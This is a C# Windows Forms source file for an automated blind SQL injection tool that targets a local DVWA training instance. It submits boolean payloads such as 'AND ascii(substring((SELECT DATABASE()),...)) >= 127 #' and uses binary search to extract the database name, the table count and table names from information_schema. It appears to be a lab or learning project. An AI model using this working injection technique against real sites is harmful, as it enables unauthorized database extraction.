using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Tool_SqlInjectionBlind_Dvwa
{
    public partial class frm_Main : Form
    {
        public frm_Main()
        {
            InitializeComponent();
            this.vp = new Tool_SqlInjectionBlind_Dvwa.ViewProcess();
            vp.Show();

            wbro_Brower.Navigate("http://localhost/dvwa/login.php");

            wbro_Brower.ScriptErrorsSuppressed = true;
        }

        HtmlDocument html_Document_Current;

        private string html;


        private string sql;

        #region Creating drag form by pnl_ControlBar
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void pnl_Header_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, 0xA1, 0x2, 0);
            }
        }
        #endregion

        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool InternetSetCookie(string lpszUrlName, string lpszCookieName, string lpszCookieData);

        private void btn_Power_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("App will be shutdown. Are you sure?", "Warning", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
                System.Windows.Forms.Application.Exit();
        }

        private void btn_ViewHTHL_Click(object sender, EventArgs e)
        {
            frm_ViewHTML view_HTML = new frm_ViewHTML(this.html);
            view_HTML.ShowDialog();
        }

        private void PutData(string sql)
        {
            vp.rtxt_View.Text += sql + Environment.NewLine;
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("id")[0].SetAttribute("value", sql); //coplete data to textbox
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("Submit")[0].InvokeMember("click"); // call event click button submit
        }


        int left = 0;
        int right = 255;
        int mid = 127;
        bool btn_Click = false;
        bool is_Done = false;
        string str_result = "";

        int index = 0;
        bool count_Tables_Done = false;
        bool is_Click_btn_DatabaseName = false;
        bool is_Click_btn_TablesName = false;


        private void wbro_Brower_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            txt_Url.Text = wbro_Brower.Url.ToString();
            html = wbro_Brower.DocumentText;

            html_Document_Current = wbro_Brower.Document;

            if (btn_Click)
            {
                ResultRequest.Result result = Handing.GetResultSubmit(html_Document_Current);
                ResultRequest.Job work_state = ResultRequest.Job.None;

                if (is_Click_btn_DatabaseName)
                {
                    work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.DB_Name,
                        ref sql, ref left, ref right, ref mid, ref str_result);
                }
                else if(is_Click_btn_TablesName)
                {
                    if (count_Tables_Done)
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.TABLES_NAME,
                            ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                    else
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.TABLES_NAME,
                            ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                }


                if (work_state == ResultRequest.Job.Done_ALL)
                {
                    if(is_Click_btn_DatabaseName)
                    {
                        is_Click_btn_DatabaseName = false;
                    }
                    else if(is_Click_btn_TablesName)
                    {
                        if(count_Tables_Done) // print table name
                        {
                            index = 0;
                            if (Variable.Index_Tables < Variable.Quantity_Tables)
                            {
                                Variable.Index_Tables++;
                                left = 0; right = 255; mid = 127;
                                btn_GetTBsName.PerformClick();
                                return;
                            }
                            else // all done
                            {
                                index = 0;
                                is_Click_btn_TablesName = false;
                                btn_Click = false;

                                cmb_TbsName.Items.Add(Variable.Db_TablesName);
                                return;
                            }
                        }
                        else
                        {
                            lbl_Count_TBsName.Text += str_result;
                            Variable.Quantity_Tables = Convert.ToInt32(str_result);
                            count_Tables_Done = true;
                            left = 0; right = 255; mid = 127; index = 0;
                            btn_GetTBsName.PerformClick();
                            return;
                        }
                        
                    }

                    btn_Click = false;

                }
                else if(work_state == ResultRequest.Job.Done_OnePart)
                {
                    if (is_Click_btn_DatabaseName)
                    {
                        lbl_Result_DBName.Text += str_result;
                        Variable.Db_Name += str_result;

                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DB_Name, ref index);
                    }
                    else if(is_Click_btn_TablesName)
                    {
                        Variable.Db_TablesName[Variable.Index_Tables] += str_result;
                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
                    }
                    

                    PutData(sql);
                }
                else if(work_state == ResultRequest.Job.Continue)
                {   
                    PutData(sql);
                }
            }

        }

        private void btn_Go_Click(object sender, EventArgs e)
        {
            if(txt_Url.Text == String.Empty)
            {
                txt_Url.Focus();
            }
            else
            {
                wbro_Brower.Url = new Uri(txt_Url.Text);
            }
        }
        

        private void button1_Click(object sender, EventArgs e)
        {
            btn_Click = true;
            is_Click_btn_DatabaseName = true;

            sql = "1' AND ascii(lower(substring((SELECT DATABASE()), 0,1))) >= 127 #";

            sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DB_Name, ref index);
            PutData(sql);

            btn_GetDBName.Enabled = false;
        }


        private void btn_GetTBsName_Click(object sender, EventArgs e)
        {
            btn_Click = true;

            is_Click_btn_TablesName = true;

            if (count_Tables_Done)
            {
                if(Variable.Db_TablesName.Count == 0)
                {
                   for(int run = 0; run < Variable.Quantity_Tables; run++)
                    {
                        Variable.Db_TablesName.Add("");
                    }
                }
                sql = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                if (Variable.Index_Tables < Variable.Quantity_Tables)
                {
                    sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
                    PutData(sql);
                }
                else
                {
                    foreach(string str in Variable.Db_TablesName)
                    {
                        lbl_TBsName.Text += " '" + str + "'";
                    }
                }
            }
            else
            {
                Variable.Index_Tables = 0;

                sql = "1' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA LIKE 'dvwa') >= 127 #";

                PutData(sql);
            }

            //btn_GetTBsName.Enabled = false;

        }

        private void btn_GetColsName_Click(object sender, EventArgs e)
        {
            
        }
    }
}
